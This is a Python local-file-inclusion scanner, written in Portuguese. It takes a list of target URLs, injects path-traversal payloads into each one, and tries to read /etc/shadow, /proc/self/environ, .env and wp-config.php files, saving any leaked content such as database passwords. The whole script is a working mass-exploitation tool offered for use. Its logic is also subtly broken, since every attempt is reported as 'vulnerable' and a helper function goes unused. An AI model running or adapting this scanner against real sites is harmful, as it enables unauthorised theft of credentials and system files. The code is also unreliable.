import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# ======= CONFIG =======
lista_urls = 'lista.txt'
salvar_arquivo = 'resultados.txt'

wordlist = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/issue", "/etc/group", "/etc/profile", "/etc/cron.d",
    "/etc/crontab", "/etc/php.ini", "/etc/httpd/conf/httpd.conf",
    "/etc/nginx/nginx.conf", "/proc/version", "/proc/cpuinfo",
    "/proc/meminfo", "/proc/self/environ", "/proc/self/cmdline",
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/root/.bash_history", "/home/cpanel/.my.cnf", "/home/cpanel/.bashrc",
    "/home/cpanel/public_html/wp-config.php", "/var/www/html/wp-config.php",
    "/var/www/html/config.php", "/var/www/html/.env", "/.env",
    "../../../../../../../../etc/passwd%00", "../../../../../../../../proc/self/environ",
    "../../../../../../../../home/cpanel/public_html/wp-config.php"
]
# =======================

def montar_url(base_url, novo_valor):
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)

    if not qs:
        return None  # ignora se não tiver query string

    primeira_chave = list(qs.keys())[0]
    qs[primeira_chave] = [novo_valor]

    nova_query = urlencode(qs, doseq=True)
    nova_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', nova_query, ''))
    return nova_url

import requests

def testar_lfi(url_modificada):
    try:
        r = requests.get(url_modificada, timeout=5, stream=True)
        tipo_resposta = r.headers.get("Content-Type", "")
        dispo = r.headers.get("Content-Disposition", "")

        if r.status_code == 200:
            # Checa se é texto legível
            if "text" in tipo_resposta or r.encoding:
                conteudo = r.text
                if any(x in conteudo for x in ["root:x:", "DB_PASSWORD", "define("]):
                    print(f"✔️ TEXTO: {url_modificada}")
                    return ("texto", url_modificada, conteudo[:300])
            # Se não é texto, mas é forçado como download
            elif "attachment" in dispo:
                tamanho = int(r.headers.get('Content-Length', '0'))
                if tamanho > 10:
                    print(f"💾 DOWNLOAD: {url_modificada} (arquivo com {tamanho} bytes)")
                    return ("download", url_modificada, f"[Arquivo baixado com {tamanho} bytes]")
                else:
                    print(f"⚠️ DOWNLOAD VAZIO: {url_modificada}")
                    return ("vazio", url_modificada, f"[Arquivo vazio ou protegido]")
        else:
            print(f"❌ {url_modificada} (status {r.status_code})")
    except KeyboardInterrupt:
        print("\n⛔ Interrompido pelo usuário.")
        exit()
    except Exception as e:
        print(f"🧨 ERRO: {url_modificada} => {e}")
    return ("invalido", url_modificada, None)



try:
    with open(lista_urls, 'r') as f:
        urls = [linha.strip() for linha in f if linha.strip()]

    with open(salvar_arquivo, 'w', encoding='utf-8') as out:
        for base_url in urls:
            print(f'\n🌐 Testando: {base_url}')
            for payload in wordlist:
                full_url = base_url
                if "=" in base_url:
                    pos = base_url.find("=") + 1
                    full_url = base_url[:pos] + payload
                else:
                    full_url = base_url + payload

                ok, link, conteudo = testar_lfi(full_url)
                if ok:
                    print(f'✅ VULNERÁVEL: {link}')
                    out.write(f'URL: {link}\n{conteudo}\n\n')
                else:
                    print(f'❌ {payload}')

except KeyboardInterrupt:
    print("\n🛑 Interrompido por Ctrl+C. Saindo com dignidade...")
    exit()
